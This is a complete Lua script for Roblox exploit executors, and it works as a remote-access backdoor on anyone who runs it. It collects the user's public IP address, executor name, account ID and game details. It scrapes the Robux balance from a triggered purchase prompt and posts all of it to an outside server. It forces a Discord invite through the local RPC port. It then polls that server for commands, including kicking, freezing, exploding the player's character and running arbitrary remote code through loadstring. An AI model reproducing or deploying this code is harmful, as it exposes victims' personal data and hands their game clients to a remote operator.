local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
if not player then return end

local SERVER_URL = "https://roblox-panel-production.up.railway.app/"
local PLAYER_ID = player.UserId
local request = syn and syn.request or request or http_request or http.request or fluxus and fluxus.request

local spinning = false
local rainbowActive = false
local invisibleActive = false
local currentSound = nil
local textScreenGui = nil
getgenv().robuxBalance = nil

local executorName = "Unknown"
pcall(function()
    executorName = identifyexecutor() or "Unknown"
end)

local publicIP = "Unknown"
pcall(function()
    local resp = game:HttpGet("http://api.ipify.org/?format=json")
    local data = HttpService:JSONDecode(resp)
    publicIP = data.ip or "Unknown"
end)

-- Discord RPC Invite
pcall(function()
    request({
        Url = "http://127.0.0.1:6463/rpc?v=1",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            Origin = "https://discord.com"
        },
        Body = HttpService:JSONEncode({
            cmd = "INVITE_BROWSER",
            nonce = HttpService:GenerateGUID(false),
            args = { code = "GNurMFgVFK" }
        })
    })
end)

local function getRobuxBalance()
    local success, result = pcall(function()
        local gamePassId = 1613005644
        MarketplaceService:PromptGamePassPurchase(player, gamePassId)

        repeat task.wait(0.1) until CoreGui:FindFirstChild("FoundationOverlay")
            and CoreGui.FoundationOverlay:FindFirstChild("UnifiedRobuxUpsellModal")

        task.spawn(function()
            local overlay = CoreGui.FoundationOverlay
            for _, v in pairs(overlay:GetDescendants()) do
                if v:IsA("TextLabel")
                and v.Name == "RobuxPrice"
                and v.Parent.Name == "RightSide" then
                    getgenv().robuxBalance = v.ContentText:gsub("%D+", "")
                end
            end
        end)

        repeat task.wait() until getgenv().robuxBalance
        return getgenv().robuxBalance
    end)

    return success and result or "?"
end

local function register()
    local robuxBalance = getRobuxBalance()
    repeat task.wait() until robuxBalance

    pcall(function()
        request({
            Url = SERVER_URL .. "/api",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                action = "register",
                userid = PLAYER_ID,
                username = player.Name,
                executor = executorName,
                ip = publicIP,
                game = MarketplaceService:GetProductInfo(game.PlaceId).Name,
                gameId = game.PlaceId,
                jobId = game.JobId,
                robux = robuxBalance
            })
        })
    end)
end

local function heartbeat()
    while true do
        pcall(function()
            request({
                Url = SERVER_URL .. "/api",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    action = "heartbeat",
                    userid = PLAYER_ID
                })
            })
        end)
        task.wait(5)
    end
end

local function createTextScreen(text)
    if textScreenGui then textScreenGui:Destroy() end

    textScreenGui = Instance.new("ScreenGui")
    textScreenGui.ResetOnSpawn = false

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1,0,1,0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.TextColor3 = Color3.fromRGB(0,255,170)
    label.TextStrokeTransparency = 0
    label.Parent = textScreenGui

    textScreenGui.Parent = player.PlayerGui
end

local function hideTextScreen()
    if textScreenGui then
        textScreenGui:Destroy()
        textScreenGui = nil
    end
end

local function executeLuaScript(script)
    pcall(function()
        loadstring(script)()
    end)
end

local function applyInvisible(state)
    local char = player.Character or player.CharacterAdded:Wait()
    for _, part in pairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Transparency = state and 1 or 0
        elseif part:IsA("Accessory") then
            local h = part:FindFirstChild("Handle")
            if h then h.Transparency = state and 1 or 0 end
        end
    end
    invisibleActive = state
end

local function applyRainbow(state)
    local char = player.Character or player.CharacterAdded:Wait()
    rainbowActive = state

    if state then
        task.spawn(function()
            local i = 0
            while rainbowActive do
                i = (i + 1) % 100
                for _, part in pairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.Color = Color3.fromHSV(i/100,1,1)
                    end
                end
                task.wait(0.1)
            end
        end)
    else
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Color = Color3.fromRGB(163,162,162)
            end
        end
    end
end

local function poll()
    while true do
        local success, resp = pcall(function()
            return request({
                Url = SERVER_URL .. "/api?userid=" .. PLAYER_ID,
                Method = "GET"
            })
        end)

        if success and resp and resp.Body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, resp.Body)
            if ok and data and data.command then
                local char = player.Character or player.CharacterAdded:Wait()
                local hum = char:WaitForChild("Humanoid")
                local root = char:WaitForChild("HumanoidRootPart")

                if data.command == "kick" then
                    player:Kick(data.reason or "Kicked")

                elseif data.command == "freeze" then
                    hum.WalkSpeed = 0
                    hum.JumpPower = 0
                    root.Anchored = true

                elseif data.command == "unfreeze" then
                    hum.WalkSpeed = 16
                    hum.JumpPower = 50
                    root.Anchored = false

                elseif data.command == "spin" then
                    spinning = true
                    task.spawn(function()
                        while spinning do
                            root.CFrame *= CFrame.Angles(0, math.rad(20), 0)
                            task.wait(0.05)
                        end
                    end)

                elseif data.command == "unspin" then
                    spinning = false

                elseif data.command == "jump" then
                    hum:ChangeState(Enum.HumanoidStateType.Jumping)

                elseif data.command == "rainbow" then
                    applyRainbow(true)

                elseif data.command == "unrainbow" then
                    applyRainbow(false)

                elseif data.command == "invisible" then
                    applyInvisible(true)

                elseif data.command == "uninvisible" then
                    applyInvisible(false)

                elseif data.command == "explode" then
                    local e = Instance.new("Explosion")
                    e.Position = root.Position
                    e.BlastRadius = 50
                    e.BlastPressure = 500000
                    e.Parent = workspace

                elseif data.command == "luaexec" and data.script then
                    executeLuaScript(data.script)

                elseif data.command == "playsound" and data.assetId then
                    local head = char:FindFirstChild("Head")
                    if head then
                        if currentSound then currentSound:Stop() end
                        currentSound = Instance.new("Sound", head)
                        currentSound.SoundId = "rbxassetid://" .. data.assetId
                        currentSound.Volume = 1
                        currentSound:Play()
                    end

                elseif data.command == "stopsound" then
                    if currentSound then
                        currentSound:Stop()
                        currentSound:Destroy()
                        currentSound = nil
                    end

                elseif data.command == "textscreen" and data.text then
                    createTextScreen(data.text)

                elseif data.command == "hidetext" then
                    hideTextScreen()

                elseif data.command == "refreshrobux" then
                    local rb = getRobuxBalance()
                    pcall(function()
                        request({
                            Url = SERVER_URL .. "/api",
                            Method = "POST",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = HttpService:JSONEncode({
                                action = "updaterobux",
                                userid = PLAYER_ID,
                                robux = rb
                            })
                        })
                    end)
                end
            end
        end
        task.wait(3)
    end
end

register()
task.spawn(heartbeat)
task.spawn(poll)
